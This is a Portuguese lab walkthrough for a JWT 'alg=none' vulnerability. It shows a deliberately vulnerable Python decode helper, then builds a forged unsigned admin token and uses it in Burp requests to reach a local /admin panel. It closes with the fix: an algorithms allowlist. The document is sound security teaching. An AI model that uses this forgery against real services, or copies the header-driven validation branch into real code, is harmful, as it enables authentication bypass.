# Walkthrough — jwt-none-alg

## 1. Contexto

A app é um login mínimo baseado em token. Você visita `/`, o servidor te entrega um JWT emitido em seu nome (`alice`, `role: user`) — não tem form de login, o token é emitido automático pra o lab ter zero cerimônia. A partir daí, dois endpoints protegidos são alcançáveis pelo Burp:

- `GET /me` — retorna as claims `sub` e `role` decodadas em texto plano. Útil como feedback intermediário: "dado este token, quem o servidor acha que eu sou?"
- `GET /admin` — retorna o painel admin se a claim decodada tiver `role=="admin"`, caso contrário `403 Forbidden`.

Os dois endpoints esperam o header padrão `Authorization: Bearer <jwt>`. Seu objetivo, como `alice` (usuário comum), é ler `/admin` sem ter a chave de assinatura de um admin.

## 2. Anatomy of a JWT

Você não consegue explorar o que não consegue ler. Antes do primeiro request, internalize o layout do JWT — os próximos passos vão editar cada peça em sequência.

Um JWT são três segmentos independentes, colados com pontos:

```
<base64url(header)> . <base64url(payload)> . <base64url(signature)>
```

Cada segmento é base64url-encoded — JSON pra header e payload, bytes crus pra signature. Pegue o token que a home acabou de te entregar. Vai ser parecido com:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.AbxKYDONyz_hh1VurfJ5g_3aaVYKrxs6sofjzj8agW0
```

A signature varia de token pra token (depende dos bytes exatos assinados), mas os bytes do header e do payload são determinísticos pra um JSON idêntico. Decoded, os três segmentos:

| segmento | base64url | JSON |
|---|---|---|
| header | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` | `{"alg":"HS256","typ":"JWT"}` |
| payload | `eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0` | `{"sub":"alice","role":"user"}` |
| signature | `AbxKYDON...` (varia) | HMAC-SHA256 de `header + "." + payload`, com chave igual ao secret do servidor |

Dois fatos pra fixar:

- **O header anuncia qual algoritmo assinou o payload.** É *dado vindo do lado do cliente* — o servidor lê, mas não foi o servidor que escreveu.
- **base64url não é encryption.** É só um encoding URL-safe; qualquer um com o token consegue ler header e payload. Os próximos passos vão reescrever os dois.

### Decoding e re-encoding na mão

Dois caminhos, os dois mostrados porque você vai alternar entre eles:

**Burp Decoder.** Abra a aba **Decoder** → cole um segmento → clique **Decode as → Base64**. O Burp tolera o `=` de padding faltando que o base64url omite. Pra re-encodar, cole o JSON modificado na metade de cima do Decoder → **Encode as → Base64** → depois **substitua manualmente `+` por `-`, `/` por `_`, e remova qualquer `=` do final**. O encoder de Base64 padrão do Burp não é URL-safe por default, então essas três substituições ficam por sua conta.

**Terminal one-liner.** Mais rápido depois que você fizer duas vezes:

```bash
# decode (ignore os warnings de padding; o base64 -d ignora também na saída)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

# encode
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
```

Os dois `tr` transformam a saída padrão do base64 na variante URL-safe que a spec do JWT exige. Os dois caminhos produzem bytes idênticos.

## 3. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). O helper de decode do token é assim:

```python
def decode(token):
    header = jwt.get_unverified_header(token)
    if header.get("alg") == "none":
        # TODO: remove after local testing — accepts unsigned tokens
        return jwt.decode(token, options={"verify_signature": False})
    return jwt.decode(token, SECRET, algorithms=["HS256"])
```

Duas observações pra carregar antes de explorar:

- **O TODO é uma confissão.** Um dev adicionou um path que aceita tokens sem assinatura "pra testar local" e foi pra produção. CVEs reais em código JWT aparecem exatamente nessa forma — o bug é um atalho de debug que sobreviveu até prod.
- **A decisão de *como* validar o token é tomada com base em `header["alg"]`** — um valor que o cliente colocou dentro do token. O servidor está perguntando ao header do token "preciso checar sua assinatura?" e obedecendo a resposta.

A primeira observação é suficiente pra fazer o exploit funcionar. A segunda é a lição mais funda, e voltamos a ela depois que você tiver visto o exploit dar certo, na seção 5.

## 4. Exploração via Burp Suite (trilha principal)

Configure o Burp Proxy e aponte o browser pra ele. Visite <http://127.0.0.1:8005/>, capture o request `GET /` em **Proxy → HTTP history**, e copie o JWT do body da response (a página renderiza ele dentro de um `<div class="token">`). Daqui pra frente, todo request passa pelo Repeater.

### Passo 1 — Confirmar que /admin rejeita seu token legítimo

Clique com o botão direito em qualquer request capturada pra <http://127.0.0.1:8005/> em **HTTP history** → **Send to Repeater**. Edite a request no Repeater pra:

```
GET /admin HTTP/1.1
Host: 127.0.0.1:8005
Authorization: Bearer <seu-token-legítimo>
```

(Cole o token literal — sem o prefixo `Bearer ` dentro de `<...>`, esse prefixo já existe.)

Response: `403 Forbidden`. O servidor validou seu token sob HS256 (signature OK, decodou `{"sub":"alice","role":"user"}`), depois negou acesso porque seu role é `user`, não `admin`. Esse é o baseline legítimo — auth funcionando como projetado.

### Passo 2 — Forjar um token alg=none com role=admin

Monte um token novo na mão. As três peças:

```
header     {"alg":"none","typ":"JWT"}
payload    {"sub":"alice","role":"admin"}
signature  (vazio)
```

Encode cada um. No Burp Decoder: cole cada JSON, **Encode as → Base64**, remova o padding `=`, troque `+`→`-` e `/`→`_`. No terminal:

```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}'        | base64 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"sub":"alice","role":"admin"}'   | base64 | tr '+/' '-_' | tr -d '=')
echo "${HEADER}.${PAYLOAD}."
```

Qualquer caminho gera a mesma string:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.
```

O ponto final é obrigatório — o formato JWT é sempre `header.payload.signature` com dois pontos. O terceiro segmento é vazio porque não tem signature; é exatamente essa a premissa do `alg=none`.

### Passo 3 — Confirmar a forja via /me primeiro

Mande o token forjado pra `/me` pra ver o que o servidor *acha* sobre ele antes de tentar `/admin`:

```
GET /me HTTP/1.1
Host: 127.0.0.1:8005
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.
```

Response: `200 OK`, body:

```
sub=alice
role=admin
```

Pause aqui por um respiro. **O servidor acabou de te dizer que acha que você é administrador** baseado num token sem assinatura nenhuma. Os bytes que você mandou contêm exatamente o JSON que você escreveu — não tem chave, nada foi assinado. O servidor simplesmente escolheu acreditar no header.

### Passo 4 — Ler /admin

Mesmo token forjado, path diferente:

```
GET /admin HTTP/1.1
Host: 127.0.0.1:8005
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.
```

Response: `200 OK`, o HTML do painel admin — `Pretend admin key`, approvals pendentes, status do sistema. Você leu conteúdo restrito a administradores usando um token que forjou sem chave nenhuma.

## 5. O que aconteceu de verdade — o bug mais fundo

O bug de superfície — "a app aceita tokens sem assinatura" — explica o que funcionou. A forma do bug é maior que isso, e merece um minuto de atenção porque a mesma forma reaparece em outras falhas de JWT.

**Este é o primeiro átomo do projeto onde o bug é uma falha de configuração criptográfica, não de input nem de lógica.** Nos átomos 01–04 a coisa quebrada era concreta: uma string SQL não-sanitizada, uma expressão HTML sem escape, um check de ownership ausente, uma URL de saída irrestrita. Aqui o código é todo crypto: secrets, signatures, HMAC. Nada disso está quebrado. O problema é que o servidor aceitou *não fazer* crypto quando o token pediu. **Parece-crypto não é é-crypto.** Uma chamada `jwt.decode(...)` cercada por uma constante `SECRET` e um parâmetro `algorithms=` parece um security boundary; se qualquer caminho pela função retorna claims parseadas sem verificar uma signature, não é.

**A segunda observação vai mais fundo.** Releia o `decode` da vulnerable:

```python
header = jwt.get_unverified_header(token)
if header.get("alg") == "none":
    return jwt.decode(token, options={"verify_signature": False})
return jwt.decode(token, SECRET, algorithms=["HS256"])
```

A política de validação — "preciso de signature aqui?" — é decidida com base num valor *dentro do token*. O token veio do cliente. Portanto, **o cliente escolhe a política de validação.** Isso é a forma de um confused deputy: um ator privilegiado (o servidor, decidindo se confia num token) recebendo ordens de um não-privilegiado (o atacante, que escreveu o header).

O branch "aceita alg=none" é uma forma de perder esse jogo. Secrets compartilhados fracos que caem em brute-force, e ataques de algorithm confusion onde o servidor é induzido a usar a chave errada, são duas outras — nenhuma envolve `none`. O padrão se repete porque a spec do JWT deliberadamente coloca `alg` no header e pede pras bibliotecas honrarem isso. Toda função de validação JWT precisa se defender contra seleção de algoritmo controlada pelo atacante.

O fix neste átomo é uma linha. O fix pra a *classe* é uma regra: **o servidor decide quais algoritmos aceita, e decide isso antes de ler o header do token.** Tudo que o token diga sobre seu próprio algoritmo de assinatura é uma dica, não uma diretiva.

## 6. Replicar contra a app fixed

A app fixed é idêntica exceto pelo helper `decode`. Pegue o mesmo token forjado do passo 2 e mande pra a porta `8105`:

```
GET /admin HTTP/1.1
Host: 127.0.0.1:8105
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.
```

Response: `401 Unauthorized`. **Mesmos bytes, mesmo path, comportamento oposto.** O fix removeu o branch `if header["alg"] == "none"` (veja [`DIFF.pt-BR.md`](./DIFF.pt-BR.md)), então a verificação HS256 normal do PyJWT roda, vê que `alg=none` não está na allowlist `["HS256"]`, e recusa.

Pra ter o quadro completo, emita também um token *legítimo* novo na home da fixed (porta 8105) e replique contra `GET /admin` na mesma porta: continua `403`, porque role é `user`. A fixed continua autenticando usuários legítimos certo; o que ela parou de fazer é deixar o header do token guiar a lógica de validação.

## 7. Por que o fix funciona

Veja [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra a mudança. O `decode` da fixed é uma linha:

```python
def decode(token):
    return jwt.decode(token, SECRET, algorithms=["HS256"])
```

Três coisas importam nessa forma:

- **`algorithms` é uma lista positiva.** O PyJWT compara o `alg` do token com a lista e rejeita qualquer coisa fora dela. `none` não está na lista, então tokens sem signature falham no check de algoritmo antes de qualquer trabalho de signature começar. Adicionar `"none"` nessa lista re-introduz o bug.
- **Não tem branch no header.** O servidor se compromete com "este endpoint aceita tokens HS256" antes mesmo de ler o token. O atacante pode escrever o que quiser em `alg` — o servidor não se importa, não pergunta.
- **Blocklistar `none` não é o fix.** Uma alternativa natural-mas-errada é `if header["alg"] == "none": abort()`. Ela falha contra bypasses: case (`"None"`, `"NONE"`, `"nOnE"`), escapes Unicode (`"none"`), e outros casos de algorithm confusion que nem envolvem `none`. Allowlists são finitas; blocklists são chutes.

A regra geral, pra qualquer chamada de decode JWT que você escreva ou audite: passe `algorithms=` como uma lista positiva exatamente dos algoritmos que esse endpoint deve aceitar, e nunca faça branch baseado em `header["alg"]` pra escolher como validar. O header é dado, não política.
